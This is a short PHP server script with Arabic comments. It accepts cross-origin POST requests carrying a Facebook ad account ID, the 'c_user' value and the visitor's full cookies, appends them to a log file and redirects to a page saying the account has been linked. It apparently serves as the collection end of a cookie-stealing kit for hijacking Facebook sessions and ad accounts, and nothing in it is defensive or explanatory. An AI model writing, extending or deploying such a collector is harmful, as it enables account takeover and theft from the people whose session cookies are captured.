<?php
// السماح بالطلبات من أي مصدر (حل مشكلة CORS)
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

// التعامل مع طلب OPTIONS للـ CORS
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// التأكد من أن الطلب هو POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // استقبال البيانات المرسلة من JavaScript
    $adaccount = $_POST['adaccount'] ?? 'غير معروف';
    $c_user = $_POST['c_user'] ?? 'غير معروف';
    $cookies = $_POST['cookies'] ?? '';

    // (اختياري) تخزين البيانات في ملف تسجيل مؤقت (للتجربة فقط)
    $logData = "AdAccount: $adaccount, C_User: $c_user, Cookies: $cookies\n";
    file_put_contents("log.txt", $logData, FILE_APPEND);

    // إعادة التوجيه إلى صفحة "تم الربط"
    header("Location: success.html");
    exit();
} else {
    echo json_encode(["error" => "طلب غير صالح"]);
}
?>
